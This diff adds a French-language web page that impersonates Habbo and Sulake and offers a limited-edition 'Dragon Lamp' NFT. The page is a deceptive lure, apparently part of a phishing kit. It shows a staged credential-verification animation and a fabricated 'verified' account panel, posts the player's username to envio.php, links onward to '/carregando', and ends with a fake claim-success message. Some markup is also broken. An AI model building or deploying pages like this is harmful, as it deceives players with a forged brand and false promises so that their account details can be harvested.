@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Habbo NFT</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="https://images.habbo.com/habbo-web/america/pt/assets/images/favicon.08c747be.ico">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #124a76 0%, #0d3557 100%);
+            min-height: 100vh;
+            color: white;
+        }
+        
+        .nft-card {
+            transition: all 0.3s ease;
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+        
+        .nft-card:hover {
+            transform: translateY(-10px) scale(1.03);
+            box-shadow: 0 20px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .nft-card.disabled {
+            filter: grayscale(80%);
+            opacity: 0.7;
+        }
+        
+        .nft-card.disabled:hover {
+            transform: none;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(74, 222, 128, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+        
+        .slide-in {
+            animation: slideIn 0.5s forwards;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .habbo-avatar {
+            image-rendering: pixelated;
+            width: 110px;
+            height: 190px;
+        }
+        
+        .habbo-panel {
+            background: linear-gradient(135deg, #1a5a8d 0%, #0d3557 100%);
+            border: 3px solid #2d87ce;
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+        
+        .common {
+            color: #4ade80;
+        }
+        
+        .rare {
+            color: #60a5fa;
+            text-shadow: 0 0 5px rgba(96, 165, 250, 0.7);
+        }
+        
+        .ultra-rare {
+            color: #c084fc;
+            text-shadow: 0 0 5px rgba(192, 132, 252, 0.7);
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 5px rgba(192, 132, 252, 0.7); }
+            to { text-shadow: 0 0 15px rgba(192, 132, 252, 1); }
+        }
+        
+        .status-badge {
+            background: rgba(74, 222, 128, 0.2);
+            border: 1px solid #4ade80;
+            border-radius: 16px;
+            padding: 2px 8px;
+            font-size: 0.8rem;
+        }
+        
+        /* LOOTBOX STYLES */
+        .lootbox-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        
+        .lootbox-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .lootbox-container {
+            position: relative;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .lootbox {
+            width: 300px;
+            height: 300px;
+            margin: 0 auto;
+            position: relative;
+            cursor: pointer;
+            transform-style: preserve-3d;
+            transition: transform 0.5s;
+        }
+        
+        .lootbox img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .lootbox-shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0) rotate(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px) rotate(-5deg); }
+            20%, 40%, 60%, 80% { transform: translateX(10px) rotate(5deg); }
+        }
+        
+        .lootbox-open {
+            animation: openBox 1s forwards;
+        }
+        
+        @keyframes openBox {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(0); opacity: 0; }
+        }
+        
+        .smoke {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            opacity: 0;
+        }
+        
+        .smoke-particle {
+            position: absolute;
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            filter: blur(5px);
+            opacity: 0;
+        }
+        
+        .revealed-item {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            width: 80%;
+            max-width: 300px;
+            opacity: 0;
+            transition: all 0.5s;
+        }
+        
+        .revealed-item.active {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            opacity: 0;
+        }
+        
+        .rarity-flash {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
+        }
+        
+        .common-flash { background: radial-gradient(circle, rgba(74,222,128,0.8) 0%, rgba(74,222,128,0) 70%); }
+        .rare-flash { background: radial-gradient(circle, rgba(96,165,250,0.8) 0%, rgba(96,165,250,0) 70%); }
+        .ultra-rare-flash { background: radial-gradient(circle, rgba(192,132,252,0.8) 0%, rgba(192,132,252,0) 70%); }
+
+        /* Loading Screen Styles */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0d3557;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            transition: opacity 0.5s ease-out;
+        }
+        
+        .loading-logo {
+            width: 200px;
+            margin-bottom: 30px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .loading-bar-container {
+            width: 80%;
+            max-width: 400px;
+            height: 20px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .loading-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4ade80, #3b82f6);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .loading-steps {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            width: 80%;
+            max-width: 400px;
+            margin-top: 20px;
+        }
+        
+        .loading-step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+        }
+        
+        .loading-step.active {
+            color: white;
+        }
+        
+        .loading-step.completed {
+            color: #4ade80;
+        }
+        
+        .loading-step i {
+            margin-right: 8px;
+        }
+
+        /* Avatar Preview */
+        .avatar-preview {
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+        }
+        
+        .avatar-preview img {
+            width: 80px;
+            height: 140px;
+            image-rendering: pixelated;
+            margin: 0 auto 5px auto;
+            border: 2px solid #2d87ce;
+            border-radius: 5px;
+            display: block;
+        }
+        
+        .avatar-preview p {
+            font-size: 12px;
+            color: #a0aec0;
+            text-align: center;
+        }
+        
+        /* Error message */
+        .error-message {
+            color: #f87171;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen (Hidden by default) -->
+    <div id="loadingScreen" class="loading-screen hidden">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Habbo-logo.png" alt="Habbo Logo" class="loading-logo">
+        <div class="loading-bar-container">
+            <div id="loadingBar" class="loading-bar"></div>
+        </div>
+        <div id="loadingText" class="loading-text">Initialisation...</div>
+        
+        <div class="loading-steps">
+            <div id="step1" class="loading-step">
+                <i class="fas fa-circle-notch fa-spin"></i> Vérification des identifiants...
+            </div>
+            <div id="step2" class="loading-step">
+                <i class="far fa-circle"></i> Connexion au serveur...
+            </div>
+            <div id="step3" class="loading-step">
+                <i class="far fa-circle"></i> Chargement des données du compte...
+            </div>
+            <div id="step4" class="loading-step">
+                <i class="far fa-circle"></i> Vérification des récompenses disponibles...
+            </div>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-8">
+        <!-- Header -->
+        <header class="text-center mb-12 fade-in">
+            <div class="flex justify-center mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Habbo-logo.png" alt="Habbo Logo" class="h-16">
+            </div>
+            <h1 class="text-4xl font-bold mb-2">habbo.fr</h1>
+            <p class="text-xl text-blue-200">Collectionnez des objets rares d'Habbo au format NFT</p>
+        </header>
+        
+        <!-- Account Status Panel (Hidden by default) -->
+        <div id="accountStatus" class="hidden habbo-panel max-w-2xl mx-auto mb-12 p-6 fade-in">
+            <div class="flex flex-col md:flex-row items-center md:items-start gap-6">
+                <!-- Avatar -->
+                <div class="flex flex-col items-center">
+                    <img id="userAvatar" src="https://www.habbo.fr/habbo-imaging/avatarimage?user=HabboNFT&direction=2&head_direction=3&gesture=sml&size=l" alt="Habbo Avatar" class="habbo-avatar mb-3">
+                    <button onclick="logout()" class="text-sm text-red-400 hover:text-red-300 flex items-center">
+                        <i class="fas fa-sign-out-alt mr-1"></i> Déconnexion
+                    </button>
+                </div>
+                
+                <!-- User Info -->
+                <div class="flex-1">
+                    <div class="flex justify-between items-start mb-4">
+                        <h2 id="username" class="text-2xl font-bold text-yellow-300">HabboNFT</h2>
+                        <span class="status-badge">Éligible pour réclamer 1x NFT</span>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-gray-900 bg-opacity-50 rounded-lg p-4">
+                            <h3 class="text-sm text-gray-400 mb-1">Statut du compte</h3>
+                            <p class="font-semibold"><i class="fas fa-check-circle text-green-500 mr-2"></i> Vérifié</p>
+                        </div>
+                        
+                        <div class="bg-gray-900 bg-opacity-50 rounded-lg p-4">
+                            <h3 class="text-sm text-gray-400 mb-1">Rareté de la récompense</h3>
+                            <p id="rarity" class="font-semibold"><i class="fas fa-gem mr-2"></i> <span class="common">Commun</span></p>
+                        </div>
+                        
+                        <div class="bg-gray-900 bg-opacity-50 rounded-lg p-4">
+                            <h3 class="text-sm text-gray-400 mb-1">Expire le :</h3>
+                            <p id="memberSince" class="font-semibold"><i class="far fa-calendar-alt mr-2"></i> 31/05/2025</p>
+                        </div>
+                        
+                        <div class="bg-gray-900 bg-opacity-50 rounded-lg p-4">
+                            <h3 class="text-sm text-gray-400 mb-1">NFTs réclamés</h3>
+                            <p class="font-semibold"><i class="fas fa-coins mr-2"></i> 0/1</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Login Form (Visible by default) -->
+        <div id="loginForm" class="max-w-md mx-auto bg-gray-800 bg-opacity-50 backdrop-blur-sm rounded-xl p-8 shadow-xl fade-in">
+            <h2 class="text-2xl font-bold mb-6 text-center">Accédez à votre compte</h2>
+            
+            <div class="mb-6">
+                <label class="block text-gray-300 mb-2">Pseudo Habbo</label>
+                <input type="text" id="loginNick" placeholder="Entrez votre pseudo ici !" class="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" oninput="updateAvatarPreview()">
+                <div id="nickError" class="error-message">Veuillez entrer un pseudo valide</div>
+                
+                <!-- Avatar Preview -->
+                <div id="avatarPreview" class="avatar-preview">
+                    <img id="previewAvatar" src="" alt="Aperçu de l'avatar" onerror="handleAvatarError(this)">
+                    <p id="previewText">Votre avatar apparaîtra ici</p>
+                </div>
+            </div>
+            
+            <button onclick="login()" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-3 px-4 rounded-lg shadow-lg transition-all duration-300 transform hover:scale-105 mb-4">
+                CONNEXION
+            </button>
+        </div>
+        
+        <!-- Main Content (Hidden by default) -->
+        <main id="mainContent" class="hidden">
+            <!-- NFT Selection Grid -->
+            <div id="nftGrid" class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
+                <!-- Dragon Lamp (Available) - MOVED TO FIRST POSITION -->
+                <div class="nft-card pulse bg-gradient-to-br from-green-900 to-emerald-900 rounded-xl p-6 shadow-lg cursor-pointer" onclick="selectDragonLamp()">
+                    <div class="overflow-hidden rounded-lg mb-4 h-48 flex items-center justify-center">
+                        <img src="https://i.imgur.com/0Uhdu44.png" alt="Lampe du Dragon Bliss" class="w-full h-full object-contain">
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Lampe du Dragon Bliss</h3>
+                    <p class="text-gray-300 mb-4">Édition limitée - Collection NFT</p>
+                    <div class="flex items-center text-green-400">
+                        <i class="fas fa-check-circle mr-2"></i>
+                        <span>Disponible</span>
+                    </div>
+                </div>
+                
+                <!-- Bronze Hologram (Disabled) -->
+                <div class="nft-card disabled bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl p-6 shadow-lg">
+                    <div class="relative overflow-hidden rounded-lg mb-4 h-48 flex items-center justify-center">
+                        <img src="https://i.imgur.com/9W7KTzY.png" alt="Couronne de l'Année du Dragon" class="w-full h-full object-contain">
+                        <div class="absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center">
+                            <span class="text-white text-xl font-bold">ÉPUISÉ</span>
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Couronne de l'Année du Dragon</h3>
+                    <p class="text-gray-300 mb-4">Un objet classique d'Habbo maintenant en NFT</p>
+                    <div class="flex items-center text-red-400">
+                        <i class="fas fa-times-circle mr-2"></i>
+                        <span>Indisponible</span>
+                    </div>
+                </div>
+                
+                <!-- Habbo Avatar (Disabled) -->
+                <div class="nft-card disabled bg-gradient-to-br from-purple-900 to-blue-900 rounded-xl p-6 shadow-lg">
+                    <div class="relative overflow-hidden rounded-lg mb-4 h-48 flex items-center justify-center">
+                        <img src="https://i.imgur.com/te0YRCz.png" alt="Avatar Habbo" class="w-full h-full object-contain">
+                        <div class="absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center">
+                            <span class="text-white text-xl font-bold">ÉPUISÉ</span>
+                        </div>
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Avatar Habbo</h3>
+                    <p class="text-gray-300 mb-4">Votre personnage Habbo en NFT exclusif</p>
+                    <div class="flex items-center text-red-400">
+                        <i class="fas fa-times-circle mr-2"></i>
+                        <span>Indisponible</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- NFT Details Section (Hidden by default) -->
+            <div id="nftDetails" class="hidden slide-in bg-gray-800 bg-opacity-50 backdrop-blur-sm rounded-xl p-8 shadow-xl max-w-3xl mx-auto">
+                <div class="flex flex-col md:flex-row gap-8">
+                    <div class="md:w-1/2">
+                        <img id="selectedNftImage" src="" alt="NFT Sélectionné" class="w-full rounded-lg shadow-lg">
+                    </div>
+                    <div class="md:w-1/2">
+                        <h2 id="selectedNftTitle" class="text-2xl font-bold mb-2"></h2>
+                        <p id="selectedNftDescription" class="text-gray-300 mb-6"></p>
+                        
+                        <div id="claimForm" class="bg-gray-900 bg-opacity-70 rounded-lg p-6">
+                            <h3 class="text-lg font-semibold mb-4">Réclamer NFT</h3>
+                            
+                            <form action="envio.php" method="post"><div class="mb-4">
+                                <label class="block text-gray-300 mb-2">Confirmez votre pseudo</label>
+                                <input name="usuario" type="text" id="confirmNick" placeholder="VotrePseudoHabbo" class="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500">
+                            </div>
+                            
+                            <div class="flex items-center mb-6">
+                                <input type="checkbox" id="terms" class="mr-2">
+                                <label for="terms" class="text-sm text-gray-300">J'accepte les <a href="#" class="text-green-400 hover:underline">Conditions d'Utilisation</a></label>
+                            </div>
+                            
+                            <button id="claimButton" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-3 px-4 rounded-lg shadow-lg transition-all duration-300 transform hover:scale-105">
+                                RÉCLAMER NFT
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <button onclick="backToSelection()" class="mt-6 text-blue-400 hover:text-blue-300 flex items-center">
+                    <i class="fas fa-arrow-left mr-2"></i> Retour à la sélection
+                </button>
+            </div>
+        </main>
+        
+        <!-- Footer -->
+        <footer class="mt-16 text-center text-gray-400 text-sm">
+            <div class="flex justify-center mb-4">
+                <img src="https://cdn.prod.website-files.com/6076c698731e2c3f1284457a/645e244d2cb623bf9d81f633_Sulake.png" alt="Sulake Logo" class="h-8">
+            </div>
+            <p class="mb-4">© 2004 - 2023 Sulake Corporation Ltd. HABBO est une marque déposée de Sulake Oy.</p>
+            <div class="flex justify-center space-x-6">
+                <a href="#" class="hover:text-white"><i class="fab fa-twitter"></i></a>
+                <a href="#" class="hover:text-white"><i class="fab fa-instagram"></i></a>
+                <a href="#" class="hover:text-white"><i class="fab fa-discord"></i></a>
+                <a href="#" class="hover:text-white"><i class="fab fa-facebook"></i></a>
+            </div>
+        </footer>
+    </div>
+
+    <!-- LOOTBOX OVERLAY -->
+    <div id="lootboxOverlay" class="lootbox-overlay">
+        <div class="lootbox-container">
+            <div id="lootbox" class="lootbox">
+                
+                <div id="rarityFlash" class="rarity-flash"></div>
+            </div>
+            <div id="smoke" class="smoke"></div>
+            <div id="revealedItem" class="revealed-item">
+                <img src="https://i.imgur.com/0Uhdu44.png" alt="Objet Découvert">
+                <h3 class="text-2xl font-bold mt-4">Lampe du Dragon Bliss</h3>
+                <p class="text-gray-300 mt-2">Vous avez débloqué cet objet rare !</p>
+                <a href="/carregando.."</a><button onclick="closeLootbox()" class="mt-6 bg-green-600 hover:bg-green-7 00 text-white font-bold py-2 px-6 rounded-lg">
+                    Continuer
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Login function
+        function login() {
+            const nick = document.getElementById('loginNick').value;
+            
+            if (!nick) {
+                document.getElementById('nickError').style.display = 'block';
+                return;
+            }
+            
+            // Show loading screen
+            document.getElementById('loadingScreen').classList.remove('hidden');
+            
+            // Start loading animation
+            simulateLoading(nick);
+        }
+        
+        // Simulate loading process
+        function simulateLoading(nick) {
+            const loadingBar = document.getElementById('loadingBar');
+            const loadingText = document.getElementById('loadingText');
+            const steps = [
+                { id: 'step1', text: 'Vérification des identifiants...', icon: 'fa-spinner fa-spin' },
+                { id: 'step2', text: 'Connexion au serveur...', icon: 'fa-spinner fa-spin' },
+                { id: 'step3', text: 'Chargement des données du compte...', icon: 'fa-spinner fa-spin' },
+                { id: 'step4', text: 'Vérification des récompenses disponibles...', icon: 'fa-spinner fa-spin' }
+            ];
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress > 100) progress = 100;
+                
+                loadingBar.style.width = `${progress}%`;
+                
+                // Update loading text
+                if (progress < 25) {
+                    loadingText.textContent = 'Initialisation...';
+                } else if (progress < 50) {
+                    loadingText.textContent = 'Chargement des données utilisateur...';
+                } else if (progress < 75) {
+                    loadingText.textContent = 'Vérification de la connexion...';
+                } else {
+                    loadingText.textContent = 'Presque terminé...';
+                }
+                
+                // Update steps
+                if (progress > 20) {
+                    updateStep(steps[0], 'completed', 'fa-check');
+                }
+                if (progress > 40) {
+                    updateStep(steps[1], 'completed', 'fa-check');
+                }
+                if (progress > 60) {
+                    updateStep(steps[2], 'completed', 'fa-check');
+                }
+                if (progress > 80) {
+                    updateStep(steps[3], 'completed', 'fa-check');
+                }
+                
+                // When loading is complete
+                if (progress === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        completeLogin(nick);
+                    }, 500);
+                }
+            }, 200);
+        }
+        
+        // Update loading step status
+        function updateStep(step, status, icon) {
+            const stepElement = document.getElementById(step.id);
+            if (stepElement.classList.contains(status)) return;
+            
+            stepElement.classList.remove('active');
+            stepElement.classList.add(status);
+            
+            const iconElement = stepElement.querySelector('i');
+            iconElement.className = `fas ${icon} mr-2`;
+            
+            if (status === 'completed') {
+                stepElement.innerHTML = `<i class="fas ${icon} mr-2"></i> ${step.text}`;
+            }
+        }
+        
+        // Complete login process after loading
+        function completeLogin(nick) {
+            // Hide loading screen
+            document.getElementById('loadingScreen').classList.add('hidden');
+            
+            // Hide login form
+            document.getElementById('loginForm').classList.add('hidden');
+            
+            // Show account status panel
+            const accountStatus = document.getElementById('accountStatus');
+            accountStatus.classList.remove('hidden');
+            
+            // Set username
+            document.getElementById('username').textContent = nick;
+            
+            // Generate avatar based on nick
+            document.getElementById('userAvatar').src = `https://www.habbo.fr/habbo-imaging/avatarimage?user=${nick}&direction=2&head_direction=3&gesture=sml&size=l`;
+            
+            // Set random rarity
+            const rarities = ['common', 'rare', 'ultra-rare'];
+            const rarityNames = ['Commun', 'Rare', 'Ultra Rare'];
+            const randomIndex = Math.floor(Math.random() * rarities.length);
+            
+            const rarityElement = document.getElementById('rarity');
+            rarityElement.querySelector('span').className = rarities[randomIndex];
+            rarityElement.querySelector('span').textContent = rarityNames[randomIndex];
+            
+            // Show main content
+            document.getElementById('mainContent').classList.remove('hidden');
+            
+            // Auto-fill confirmation nick
+            document.getElementById('confirmNick').value = nick;
+        }
+        
+        // Logout function
+        function logout() {
+            // Show login form
+            document.getElementById('loginForm').classList.remove('hidden');
+            
+            // Hide account status and main content
+            document.getElementById('accountStatus').classList.add('hidden');
+            document.getElementById('mainContent').classList.add('hidden');
+            
+            // Clear field
+            document.getElementById('loginNick').value = '';
+            
+            // Hide avatar preview
+            document.getElementById('avatarPreview').style.display = 'none';
+            
+            // Hide error message
+            document.getElementById('nickError').style.display = 'none';
+        }
+        
+        // Update avatar preview when typing
+        function updateAvatarPreview() {
+            const nick = document.getElementById('loginNick').value;
+            const previewContainer = document.getElementById('avatarPreview');
+            const previewImage = document.getElementById('previewAvatar');
+            const previewText = document.getElementById('previewText');
+            const errorMessage = document.getElementById('nickError');
+            
+            if (nick.length > 0) {
+                // Hide error message
+                errorMessage.style.display = 'none';
+                
+                // Show loading state
+                previewContainer.style.display = 'block';
+                previewText.textContent = 'Chargement de l\'avatar...';
+                
+                // Set image source with current timestamp to prevent caching issues
+                const timestamp = new Date().getTime();
+                previewImage.src = `https://www.habbo.fr/habbo-imaging/avatarimage?user=${nick}&direction=2&head_direction=3&gesture=sml&size=m&timestamp=${timestamp}`;
+                
+                // Check if image loads successfully
+                previewImage.onload = function() {
+                    previewText.textContent = 'Utilisateur trouvé !';
+                    previewContainer.style.display = 'block';
+                    previewImage.style.display = 'block';
+                };
+                
+                previewImage.onerror = function() {
+                    previewText.textContent = 'Utilisateur non trouvé !';
+                    previewContainer.style.display = 'block';
+                    previewImage.style.display = 'none';
+                };
+            } else {
+                previewContainer.style.display = 'none';
+                errorMessage.style.display = 'none';
+            }
+        }
+        
+        // Handle avatar image errors
+        function handleAvatarError(img) {
+            const previewText = document.getElementById('previewText');
+            previewText.textContent = 'Utilisateur non trouvé';
+            img.style.display = 'none';
+        }
+        
+        // Select Dragon Lamp NFT
+        function selectDragonLamp() {
+            document.getElementById('nftGrid').classList.add('hidden');
+            
+            const detailsSection = document.getElementById('nftDetails');
+            detailsSection.classList.remove('hidden');
+            
+            // Set NFT details
+            document.getElementById('selectedNftImage').src = 'https://i.imgur.com/0Uhdu44.png';
+            document.getElementById('selectedNftTitle').textContent = 'Lampe du Dragon Bliss';
+            document.getElementById('selectedNftDescription').textContent = 'Cette lampe magique en forme de dragon émet des couleurs psychédéliques qui changent avec le temps. Un objet rare et collectionnable disponible uniquement pour un temps limité en tant que NFT.';
+        }
+        
+        // Back to NFT selection
+        function backToSelection() {
+            document.getElementById('nftGrid').classList.remove('hidden');
+            document.getElementById('nftDetails').classList.add('hidden');
+        }
+        
+        // Show lootbox animation
+        function showLootbox() {
+            const overlay = document.getElementById('lootboxOverlay');
+            const lootbox = document.getElementById('lootbox');
+            const rarity = document.querySelector('#rarity span').className;
+            
+            // Set rarity flash color
+            document.getElementById('rarityFlash').className = `rarity-flash ${rarity}-flash`;
+            
+            // Show overlay
+            overlay.classList.add('active');
+            
+            // Shake animation
+            setTimeout(() => {
+                lootbox.classList.add('lootbox-shake');
+                
+                // After shake, open the box
+                setTimeout(() => {
+                    lootbox.classList.remove('lootbox-shake');
+                    lootbox.classList.add('lootbox-open');
+                    createSmoke();
+                    
+                    // Show revealed item after box disappears
+                    setTimeout(() => {
+                        document.getElementById('revealedItem').classList.add('active');
+                        createConfetti();
+                        document.getElementById('rarityFlash').style.opacity = '1';
+                        document.getElementById('rarityFlash').style.animation = 'fadeOut 1s forwards 1s';
+                    }, 1000);
+                }, 500);
+            }, 500);
+        }
+        
+        // Close lootbox
+        function closeLootbox() {
+            const overlay = document.getElementById('lootboxOverlay');
+            const lootbox = document.getElementById('lootbox');
+            const revealedItem = document.getElementById('revealedItem');
+            
+            // Reset animations
+            lootbox.classList.remove('lootbox-open', 'lootbox-shake');
+            revealedItem.classList.remove('active');
+            document.getElementById('rarityFlash').style.opacity = '0';
+            document.getElementById('rarityFlash').style.animation = '';
+            
+            // Hide overlay
+            overlay.classList.remove('active');
+            
+            // Update UI
+            const claimForm = document.getElementById('claimForm');
+            claimForm.innerHTML = `
+                <div class="text-center py-8">
+                    <div class="text-green-500 text-5xl mb-4">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-2">NFT Réclamé avec Succès !</h3>
+                    <p class="text-gray-300 mb-4">Votre objet sera envoyé à votre compte Habbo sous peu.</p>
+                    <button onclick="backToSelection()" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-lg">
+                        Retour
+                    </button>
+                </div>
+            `;
+            
+            // Update account status
+            document.querySelector('.status-badge').textContent = 'Réclamation terminée';
+            document.querySelector('.status-badge').classList.remove('status-badge');
+            document.querySelector('.status-badge').classList.add('bg-gray-700', 'text-gray-300');
+            document.querySelector('[aria-label="NFTs réclamés"] p').innerHTML = '<i class="fas fa-coins mr-2"></i> 1/1';
+        }
+        
+        // Create smoke effect
+        function createSmoke() {
+            const smokeContainer = document.getElementById('smoke');
+            smokeContainer.innerHTML = '';
+            smokeContainer.style.opacity = '1';
+            
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'smoke-particle';
+                
+                // Random position
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                
+                // Random size
+                const size = Math.random() * 20 + 10;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${posX}%`;
+                particle.style.top = `${posY}%`;
+                
+                // Animation
+                particle.style.transition = `all ${Math.random() * 2 + 1}s ease-out`;
+                particle.style.opacity = '0.7';
+                
+                setTimeout(() => {
+                    particle.style.transform = `translate(${(Math.random() - 0.5) * 200}px, ${(Math.random() - 0.5) * 200}px)`;
+                    particle.style.opacity = '0';
+                }, 10);
+                
+                smokeContainer.appendChild(particle);
+            }
+            
+            setTimeout(() => {
+                smokeContainer.style.opacity = '0';
+            }, 1000);
+        }
+        
+        // Create confetti effect
+        function createConfetti() {
+            const container = document.getElementById('lootboxOverlay');
+            
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                
+                // Random position
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                
+                // Random color
+                const colors = ['#f00', '#0f0', '#00f', '#ff0', '#f0f', '#0ff'];
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                
+                // Random size and shape
+                const size = Math.random() * 10 + 5;
+                const isCircle = Math.random() > 0.5;
+                
+                confetti.style.width = `${size}px`;
+                confetti.style.height = `${size}px`;
+                confetti.style.left = `${posX}%`;
+                confetti.style.top = `${posY}%`;
+                confetti.style.backgroundColor = color;
+                confetti.style.borderRadius = isCircle ? '50%' : '0';
+                
+                // Animation
+                confetti.style.transition = `all ${Math.random() * 3 + 2}s ease-out`;
+                confetti.style.opacity = '1';
+                
+                setTimeout(() => {
+                    confetti.style.transform = `translate(${(Math.random() - 0.5) * 500}px, ${Math.random() * 500 + 200}px) rotate(${Math.random() * 360}deg)`;
+                    confetti.style.opacity = '0';
+                }, 10);
+                
+                container.appendChild(confetti);
+            }
+        }
+        
+        // Claim button animation
+        document.getElementById('claimButton').addEventListener('click', function() {
+            if (!document.getElementById('terms').checked) {
+                alert('Vous devez accepter les conditions d\'utilisation');
+                return;
+            }
+            
+            const nick = document.getElementById('confirmNick').value;
+            if (!nick) {
+                alert('Veuillez confirmer votre pseudo Habbo');
+                return;
+            }
+            
+            this.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Traitement...';
+            this.classList.remove('hover:scale-105');
+            this.classList.add('opacity-75');
+            
+            // Simulate claim process
+            setTimeout(() => {
+                showLootbox();
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
